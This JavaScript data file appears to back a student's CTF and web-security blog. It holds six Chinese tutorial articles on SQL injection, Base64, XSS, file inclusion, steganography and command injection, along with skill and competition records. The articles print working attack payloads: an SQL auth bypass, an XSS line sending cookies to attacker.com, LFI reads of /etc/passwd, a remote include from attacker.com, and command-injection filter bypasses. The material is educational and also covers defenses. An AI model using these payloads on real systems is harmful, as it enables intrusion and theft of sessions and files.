// 文章数据
const articles = [
  {
    id: 1,
    title: 'SQL注入入门：从0到1理解注入原理',
    category: 'web',
    date: '2024-03-15',
    readTime: 8,
    excerpt: 'SQL注入是Web安全中最常见的漏洞之一。本文将从基础概念出发，详细介绍SQL注入的原理、类型以及防御方法。',
    tags: ['SQL注入', 'Web安全', '入门'],
    content: `
## 什么是SQL注入

SQL注入（SQL Injection）是一种常见的Web安全漏洞，攻击者通过在输入字段中插入恶意SQL代码，从而操控后台数据库执行非预期的操作。

### 漏洞原理

当应用程序将用户输入直接拼接到SQL查询语句中，而没有进行适当的过滤或参数化处理时，就会产生SQL注入漏洞。

### 常见类型

1. **联合查询注入（Union Based）**
   使用UNION操作符将恶意查询结果与原查询结果合并

2. **报错注入（Error Based）**
   通过数据库报错信息获取敏感数据

3. **布尔盲注（Boolean Based Blind）**
   根据页面返回的不同结果推断数据

4. **时间盲注（Time Based Blind）**
   通过页面响应时间差异推断数据

### 简单示例

假设有一个登录查询：

\`\`\`sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
\`\`\`

如果用户输入：
- username: \`admin' OR '1'='1\`
- password: 任意值

最终的SQL语句变成：

\`\`\`sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'xxx'
\`\`\`

由于\`'1'='1'\`永远为真，攻击者就可以绕过认证。

### 防御方法

1. **使用预处理语句（Prepared Statements）**
2. **输入验证和过滤**
3. **最小权限原则**
4. **使用ORM框架**

## 总结

SQL注入虽然是一种"古老"的漏洞，但至今仍然广泛存在。理解其原理对于Web安全学习至关重要。
    `
  },
  {
    id: 2,
    title: 'Base64编码详解及CTF中的应用',
    category: 'crypto',
    date: '2024-03-10',
    readTime: 6,
    excerpt: 'Base64是一种常见的编码方式，在CTF比赛中经常出现。本文将详细介绍Base64的原理和变种。',
    tags: ['Base64', '编码', '密码学'],
    content: `
## Base64简介

Base64是一种基于64个可打印字符来表示二进制数据的编码方式。它常用于在文本协议中传输二进制数据。

### 编码原理

1. 将数据按每3个字节（24位）分组
2. 将24位数据分成4个6位组
3. 每个6位组对应一个Base64字符
4. 不足3字节时补\`=\`号

### Base64字符表

\`\`\`
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
\`\`\`

### Python实现

\`\`\`python
import base64

# 编码
data = b"Hello, CTF!"
encoded = base64.b64encode(data)
print(encoded)  # b'SGVsbG8sIENURiE='

# 解码
decoded = base64.b64decode(encoded)
print(decoded)  # b'Hello, CTF!'
\`\`\`

### CTF中的变种

1. **URL安全的Base64**
   将\`+\`替换为\`-\`，\`/\`替换为\`_\`

2. **自定义字符表**
   题目可能使用打乱顺序的字符表

3. **多重编码**
   连续进行多次Base64编码

## 总结

Base64是CTF中最基础的编码之一，熟练掌握对解题很有帮助。
    `
  },
  {
    id: 3,
    title: 'XSS跨站脚本攻击详解',
    category: 'web',
    date: '2024-03-05',
    readTime: 10,
    excerpt: 'XSS（Cross-Site Scripting）是一种客户端脚本注入攻击。本文介绍XSS的类型、利用方式和防御策略。',
    tags: ['XSS', 'Web安全', 'JavaScript'],
    content: `
## XSS简介

XSS攻击允许攻击者将恶意脚本注入到正常用户浏览的页面中，从而窃取用户cookie、会话令牌或其他敏感信息。

### XSS类型

**1. 反射型XSS（Reflected XSS）**

恶意脚本通过URL参数传递，需要诱骗用户点击恶意链接。

示例：
\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

**2. 存储型XSS（Stored XSS）**

恶意脚本被永久存储在目标服务器上，影响所有访问该页面的用户。

常见于：评论区、留言板、用户资料等

**3. DOM型XSS（DOM-based XSS）**

通过修改页面的DOM结构来执行恶意脚本，不经过服务器。

\`\`\`javascript
// 危险代码示例
var hash = location.hash.slice(1);
document.write(hash);
\`\`\`

### 常见Payload

\`\`\`html
<!-- 基础弹窗 -->
<script>alert(1)</script>

<!-- 图片报错触发 -->
<img src=x onerror=alert(1)>

<!-- 获取Cookie -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
\`\`\`

### 防御措施

1. **输入过滤**：对特殊字符进行转义
2. **输出编码**：根据上下文进行HTML实体编码
3. **CSP策略**：内容安全策略限制脚本执行
4. **HttpOnly Cookie**：防止JavaScript读取Cookie

## 总结

XSS是Web安全中的重要课题，理解其原理对攻防都有重要意义。
    `
  },
  {
    id: 4,
    title: '文件包含漏洞学习笔记',
    category: 'web',
    date: '2024-02-28',
    readTime: 7,
    excerpt: '文件包含漏洞（LFI/RFI）允许攻击者包含并执行服务器上的文件。本文介绍本地文件包含和远程文件包含的原理与利用。',
    tags: ['文件包含', 'LFI', 'RFI', 'PHP'],
    content: `
## 文件包含漏洞

文件包含漏洞发生在应用程序使用用户可控的输入来包含文件时，攻击者可能利用此漏洞读取敏感文件或执行恶意代码。

### 本地文件包含（LFI）

只能包含服务器本地的文件。

**常见利用：**

1. 读取系统文件
\`\`\`
?page=../../../../etc/passwd
\`\`\`

2. 包含日志文件
\`\`\`
?page=/var/log/apache2/access.log
\`\`\`

3. 伪协议利用
\`\`\`
?page=php://filter/read=convert.base64-encode/resource=index.php
\`\`\`

### 远程文件包含（RFI）

可以包含远程服务器上的文件（需要allow_url_include开启）。

\`\`\`
?page=http://attacker.com/shell.txt
\`\`\`

### PHP伪协议

| 协议 | 用途 |
|------|------|
| file:// | 访问本地文件 |
| http:// | 访问HTTP网址 |
| php://filter | 读写过滤流 |
| php://input | 访问POST数据 |
| data:// | 数据流 |

### 防御方法

1. **禁用危险函数**：allow_url_include = Off
2. **白名单验证**：只允许包含特定文件
3. **目录限制**：open_basedir配置
4. **输入过滤**：过滤../等目录遍历字符

## 总结

文件包含漏洞危害较大，特别是在配合其他漏洞时可能导致服务器完全沦陷。
    `
  },
  {
    id: 5,
    title: 'CTF中的隐写术入门',
    category: 'misc',
    date: '2024-02-20',
    readTime: 9,
    excerpt: '隐写术（Steganography）是将信息隐藏在其他文件中的技术。本文介绍图片隐写的常见方法和解题思路。',
    tags: ['隐写术', 'Misc', '图片分析'],
    content: `
## 隐写术简介

隐写术是将秘密信息隐藏在看似普通的文件（如图片、音频）中的技术，与加密不同，它隐藏的是信息的存在。

### 图片隐写工具

**1. binwalk**
\`\`\`bash
# 分析文件
binwalk image.jpg

# 提取隐藏文件
binwalk -e image.jpg
\`\`\`

**2. foremost**
\`\`\`bash
foremost -i image.jpg -o output/
\`\`\`

**3. steghide**
\`\`\`bash
# 提取隐藏数据
steghide extract -sf image.jpg
\`\`\`

**4. zsteg（针对PNG）**
\`\`\`bash
zsteg -a image.png
\`\`\`

### 常见隐写方法

1. **LSB（最低有效位）**
   修改像素的最低位来隐藏数据

2. **文件拼接**
   将文件附加在图片数据后

3. **元数据隐藏**
   在EXIF信息中隐藏数据

4. **双图隐写**
   需要原图进行对比

### 解题思路

1. 首先查看文件属性、EXIF信息
2. 使用strings查看可打印字符串
3. 使用binwalk/foremost提取
4. 尝试各种隐写工具
5. 分析文件十六进制

## 总结

隐写术是Misc类题目的常见考点，需要熟练掌握各种工具的使用。
    `
  },
  {
    id: 6,
    title: '命令执行漏洞利用与防御',
    category: 'web',
    date: '2024-02-15',
    readTime: 8,
    excerpt: '命令执行漏洞允许攻击者在服务器上执行任意系统命令。本文介绍命令注入的原理和绕过技巧。',
    tags: ['RCE', '命令注入', 'Web安全'],
    content: `
## 命令执行漏洞

当应用程序将用户输入直接传递给系统命令执行函数时，如果没有适当的过滤，就可能导致命令执行漏洞。

### 危险函数（PHP）

- system()
- exec()
- passthru()
- shell_exec()
- \`\`（反引号）

### 基本利用

假设代码：
\`\`\`php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
\`\`\`

攻击Payload：
\`\`\`
?ip=127.0.0.1; cat /etc/passwd
?ip=127.0.0.1 && whoami
?ip=127.0.0.1 | ls -la
\`\`\`

### 绕过技巧

**空格绕过：**
\`\`\`
cat\${IFS}/etc/passwd
cat\$IFS\$9/etc/passwd
cat</etc/passwd
\`\`\`

**命令分隔符：**
\`\`\`
;   # 顺序执行
&&  # 前面成功才执行
||  # 前面失败才执行
|   # 管道
\`\`\`

**编码绕过：**
\`\`\`
\$(printf '%s' 'cat /etc/passwd' | base64 -d)
\`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d\`
\`\`\`

**无字母数字RCE：**
使用位运算、自增等方式构造Payload

### 防御措施

1. **避免使用危险函数**
2. **输入严格过滤**
3. **使用参数化API**
4. **WAF防护**
5. **最小权限原则**

## 总结

命令执行漏洞危害极大，可以导致服务器完全失控，是重点防护对象。
    `
  }
]

// 获取所有文章
export const getAllArticles = () => articles

// 获取精选文章（前3篇）
export const getFeaturedArticles = () => articles.slice(0, 3)

// 根据ID获取文章
export const getArticleById = (id) => {
  return articles.find(a => a.id === id) || null
}

// 获取相邻文章
export const getAdjacentArticles = (id) => {
  const index = articles.findIndex(a => a.id === id)
  return {
    prev: index > 0 ? articles[index - 1] : null,
    next: index < articles.length - 1 ? articles[index + 1] : null
  }
}

// 获取分类名称
export const getCategoryName = (category) => {
  const names = {
    web: 'Web',
    pwn: 'Pwn',
    crypto: 'Crypto',
    misc: 'Misc',
    reverse: 'Reverse'
  }
  return names[category] || category
}

// 获取技能数据
export const getSkills = () => [
  { name: 'Web安全', icon: '🌐', level: 65 },
  { name: '密码学', icon: '🔐', level: 45 },
  { name: 'Misc', icon: '📦', level: 40 },
  { name: '逆向工程', icon: '🔧', level: 30 },
  { name: 'Pwn', icon: '💥', level: 20 }
]

// 获取CTF参赛记录
export const getCtfEvents = () => [
  {
    name: '新手CTF挑战赛',
    date: '2024-02',
    description: '第一次参加CTF比赛，完成了Web和Crypto方向的入门题目',
    icon: '🏁',
    tags: ['Web', 'Crypto']
  },
  {
    name: '校内网络安全竞赛',
    date: '2024-01',
    description: '代表学院参加校级比赛，获得三等奖',
    icon: '🥉',
    tags: ['Misc', 'Web']
  },
  {
    name: '线上CTF练习赛',
    date: '2023-12',
    description: '在CTFShow和Bugku平台刷题，学习基础知识',
    icon: '💻',
    tags: ['练习']
  }
]
